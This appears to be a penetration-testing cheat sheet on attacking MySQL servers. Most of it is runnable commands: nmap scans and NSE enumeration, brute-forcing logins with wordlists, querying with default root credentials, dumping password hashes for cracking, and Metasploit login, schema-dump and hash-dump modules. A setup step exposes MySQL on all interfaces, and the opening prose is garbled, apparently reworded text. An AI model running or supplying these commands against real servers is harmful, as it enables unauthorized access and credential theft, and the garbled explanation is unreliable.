*MySQL Exploitation


Introduction to MySQL-Server
-----------------------------
 - The base of MySQL will be MySQL server, which handles the majority of the database guidelines (or directions). MySQL server is accessible as a different program for use in a customer server organized condition and as a library that can be implanted (or connected) into separate applications. MySQL works alongside a few utility projects which bolster the organization of MySQL databases. Directions are sent to MySQL-Server by means of the MySQL customer, which is introduced on a PC. It runs port 3306 by default.


Further, use the following command to check whether the server is up and running or not.

# netstat -tnl




Scanning Mysql
--------------------

# nmap -sS -p- 192.168.1.4
# nmap -p3306 192.168.1.4

 - Letâ€™s scan the port again to grab as many details as we can such as its banner. Mac address, etc.

# nmap -sV -p3306 192.168.1.4

 Retrieve MySQL information using NSE scripts

# nmap -p 3306 --script=mysql-info 192.168.1.216

# nmap -p 3306 --script mysql-enum 192.168.1.5

# nmap -p 3306 --script mysql-empty-password 192.168.1.5




 Brute force MySql
 ---------------------
# nmap -p3306 --script=mysql-brute --script-args userdb=user.txt,passdb=pass.txt 192.168.1.4

# nmap -T4 -p3306 -script mysql-brute --script-args mysql-brute.threads=100 192.168.1.5



 Retrieve MySQL usernames
 ----------------------------
# nmap -p3306 192.168.1.5 --script=mysql-users --script-args mysqluser=root,mysqlpass=toor

# nmap -p3306 192.168.1.4 --script=mysql-databases --script-args mysqluser=root



 Retrieve database names
 --------------------------
# nmap -p3306 192.168.1.2 --script=mysql-databases --script-args mysqluser=root,mysqlpass=toor

# nmap -p 3306 192.168.1.23 --script=mysql-query --script-args "query=show databases,username=root,password=toor"



 Retrieve MySQL variable status ON/OFF
 --------------------------------------
 - When we want to pass a value from one SQL statement to another SQL statement, then we store the value in a MySQL user-defined variable.

 - This command will fetch MySQL variables name which help of given argument mysqluser root and mysqlpass toor.


# nmap -p3306 192.168.1.23 --script=mysql-variables --script-args mysqluser=root,mysqlpass=toor



 Retrieve Hash Dump
 ----------------------
 - This command will Dumps the password hashes from a MySQL server in a format suitable for cracking by tools such as John the Ripper.

# nmap -p3306 192.168.1.23 --script=mysql-dump-hashes --script-args username=root,password=toor



Exploitation using MSF
---------------------

 Mysql Brute-Force Attack


# use auxiliary/scanner/mysql/mysql_login
# set rhosts 192.168.1.4
# set user_file /root/Desktop/user.txt
# set pass_file /root/Desktop/pass.txt
# exploit



 Running SQL queries without Login into Mysql
 ---------------------------------------------
 - allows for simple SQL statements to be executed against a MySQL instance 

# use auxiliary/admin/mysql/mysql_sql
# set rhosts 192.162.1.108
# set username root
# set password 123
# set sql show databases
# exploit



 Extract Mysql-Schemadump Information
 -------------------------------------
 - Our next module extracts the schema information from a MySQL DB server. 

# use auxiliary/scanner/mysql/mysql_schemadump
# set rhosts 192.168.1.4
# set username root
# set password 123
# exploit



 Extracting Login from Mysql-server
 ---------------------------------------
 - And to extracts the usernames and encrypted password hashes from a MySQL server and stores them for later cracking; use the following exploit :

# use auxiliary/scanner/mysql/mysql_hashdump
# set rhosts 192.168.1.108
# set username root
# set password 123
# exploit




 Check mysql status using below commands:
-------------------------------------

# systemctl status mysql

# systemctl enable --now mysql

# systemctl start mysql

# systemctl stop mysql


# nano /etc/mysql/mariadb.conf.d/50-server.cnf

add hash like below command

--------------------------------------
#bind-address            = 127.0.0.1
--------------------------------------


 mysql login
 --------------------------------

# mysql -h 127.0.0.1 -u root -p

# mysql -u root -h 192.168.1.5 -p





